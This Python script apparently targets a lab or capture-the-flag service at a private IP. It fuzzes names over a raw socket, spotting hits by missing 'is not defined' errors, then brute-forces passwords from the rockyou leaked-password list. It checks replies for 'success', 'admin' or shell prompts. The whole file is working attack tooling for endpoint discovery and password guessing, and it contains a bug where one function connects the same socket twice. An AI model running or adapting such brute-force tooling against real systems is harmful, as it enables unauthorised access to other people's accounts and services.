import socket
from pathlib import Path

passwords_wordlist = "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt"
endpoints_wordlist = "/home/cccitron/Downloads/API_wordlist"
#hostname = input("Hostname (IP or hostname): ")
#port = int(input("Port: "))

hostname = "10.64.179.60" 
port = 8000

# Use this if there's no set ammount of tries!
def limitless_fuzz_endpoints():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((hostname, port))

    with open(endpoints_wordlist, 'rb') as f:
        endpoints = f.read()

    for endpoint in endpoints.decode().splitlines():
        try:
            client_socket.sendall(endpoint.encode(errors="ignore"))
            response = client_socket.recv(1024).decode(errors="ignore")
        except (OSError, ConnectionError) as e:
            print(f"Connection error while sending endpoint '{endpoint}': {e}. Reconnecting...")
            try:
                client_socket.close()
            except Exception:
                pass
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((hostname, port))
            continue

        if not f"name '{endpoint}' is not defined" in response:
            print(f"Endpoint: '{endpoint}' worked! Response: {response}")
            user_choice = input(f"Brute force password with endpoint: '{endpoint}' (y/n): ")
            if user_choice.lower() == "y":
                # close outer session before starting brute-force to avoid mixing server state
                try:
                    client_socket.close()
                except Exception:
                    pass

                found = limitless_brute_force(endpoint)
                if found:
                    print(f"Brute-force found a valid password for '{endpoint}'.")
                else:
                    print(f"Brute-force did not find a valid password for '{endpoint}'.")

                # recreate outer socket/session so endpoint fuzzing can continue cleanly
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((hostname, port))
                continue
            elif user_choice.lower() == 'n':
                # skip brute-force and continue with next endpoint
                print(f"Skipping brute-force for '{endpoint}'")
                continue
            else:
                print("Wrong input")

# Use this if there's no set ammount of tries!
def limitless_brute_force(endpoint):
    print("IF THERE'S A LIMITED AMMOUNT OF TRIES THE SCRIPT WILL MOST LIKELY FREEZE AND NOT RETURN ANYTHING!")
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((hostname, port))

    with open(passwords_wordlist, 'rb') as f:
        passwords =f.read()
    try:
        client_socket.connect((hostname, port))
    except Exception as e:
        print(f"Could not connect for brute-force: {e}")
        return False

    try:
        with open(passwords_wordlist, 'rb') as f:
            passwords = f.read()

        try:
            client_socket.sendall(endpoint.encode())
            response = client_socket.recv(1024).decode(errors="ignore")
        except (OSError, ConnectionError) as e:
            print(f"Connection error during initial endpoint send: {e}")
            return False

        if 'password' in response.lower():
            for password in passwords.decode(errors="ignore").splitlines():
                try:
                    client_socket.sendall(password.encode(errors="ignore"))
                    response = client_socket.recv(1024).decode(errors="ignore")
                except (OSError, ConnectionError) as e:
                    print(f"Connection error while sending password: {e}")
                    return False

                if any(word in response.lower() for word in ("success", "admin", "$")):
                    print(response)
                    print(f"Password is '{password}'")
                    return True
    except FileNotFoundError:
        print(f"Password file not found: {passwords_wordlist}")
    finally:
        try:
            client_socket.close()
        except Exception:
            pass

    return False

def limit_send_endpoint(endpoint):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((hostname, port))
        client_socket.sendall(endpoint.encode())
        response = client_socket.recv(1024).decode()
        if not f"name '{endpoint}' is not defined" in response:
            return True
        return False
    except (OSError, ConnectionError) as e:
        print(f"Connection error in limit_send_endpoint: {e}")
        return False
    finally:
        try:
            client_socket.close()
        except Exception:
            pass

def limit_fuzz_endpoint(passwords_wordlist, endpoints_wordlist):
    while True:
        try:
            with open(endpoints_wordlist, 'rb') as f:
                endpoints = f.read()
        except FileNotFoundError:
            print(f"Endpoints file not found: {endpoints_wordlist}")
            return

        for endpoint in endpoints.decode(errors="ignore").splitlines():
            if limit_send_endpoint(endpoint):
                print(f"Found endpoint: '{endpoint}'")
                while True:
                    fuzz_again = input("Try to find another endpoint? (y/n): ")
                    if fuzz_again.lower() == 'y':
                        break
                    elif fuzz_again.lower() == 'n':
                        # start brute-force for this endpoint
                        limit_brute_force(endpoint, passwords_wordlist)
                        return
                    else:
                        print("Wrong input (y/n)")
            else:
                print(f"Endpoint '{endpoint}' was incorrect, reconnecting!")

def limit_send_password(password, endpoint):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((hostname, port))
        # send endpoint first to set server state, then send password
        client_socket.sendall(endpoint.encode())
        _ = client_socket.recv(1024).decode(errors="ignore")
        client_socket.sendall(password.encode())
        response = client_socket.recv(1024).decode(errors="ignore")
        if any(word in response.lower() for word in ("success", "admin", "$", "shell")):
            return True
        return False
    except (OSError, ConnectionError) as e:
        print(f"Connection error in limit_send_password: {e}")
        return False
    finally:
        try:
            client_socket.close()
        except Exception:
            pass


def limit_brute_force(endpoint, passwords_wordlist):
    try:
        with open(passwords_wordlist, 'rb') as f:
            passwords = f.read()
    except FileNotFoundError:
        print(f"Password file not found: {passwords_wordlist}")
        return False

    for password in passwords.decode(errors="ignore").splitlines():
        if limit_send_password(password, endpoint):
            print(f"Password found!: '{password}'")
            return True
        else:
            print(f"Password '{password}' was incorrect, reconnecting!")

    print("Exhausted password list without success")
    return False

def main():
    from pathlib import Path

    print("There are 2 modes: 'limitless' and 'limit'.")
    print(" - 'limitless': fuzz endpoints and optionally brute-force when you choose (no try limit handling)")
    print(" - 'limit'    : use endpoint and password wordlists (safer for servers that limit attempts)")

    while True:
        version = input("Choose mode (limitless/limit) or 'q' to quit: ").strip().lower()
        if version in ("q", "quit", "exit"):
            print("Exiting.")
            return

        if version == "limitless":
            # ensure endpoints file exists
            if not Path(endpoints_wordlist).exists():
                alt = input(f"Endpoints file not found ({endpoints_wordlist}). Enter path or 'c' to cancel: ").strip()
                if alt.lower() in ("c", "cancel"):
                    continue
                if not Path(alt).exists():
                    print(f"Path '{alt}' does not exist. Try again.")
                    continue
                # override global for this run
                globals()['endpoints_wordlist'] = alt

            limitless_fuzz_endpoints()
            break

        if version == "limit":
            # ensure both files exist (prompt if not)
            pw = passwords_wordlist
            ep = endpoints_wordlist
            if not Path(pw).exists():
                alt = input(f"Password file not found ({pw}). Enter path or 'c' to cancel: ").strip()
                if alt.lower() in ("c", "cancel"):
                    continue
                if not Path(alt).exists():
                    print(f"Path '{alt}' does not exist. Try again.")
                    continue
                pw = alt
            if not Path(ep).exists():
                alt = input(f"Endpoints file not found ({ep}). Enter path or 'c' to cancel: ").strip()
                if alt.lower() in ("c", "cancel"):
                    continue
                if not Path(alt).exists():
                    print(f"Path '{alt}' does not exist. Try again.")
                    continue
                ep = alt

            # call limit mode with validated paths
            limit_fuzz_endpoint(pw, ep)
            break

        print("Invalid choice. Please type 'limitless' or 'limit'.")

if __name__ == "__main__":
    main()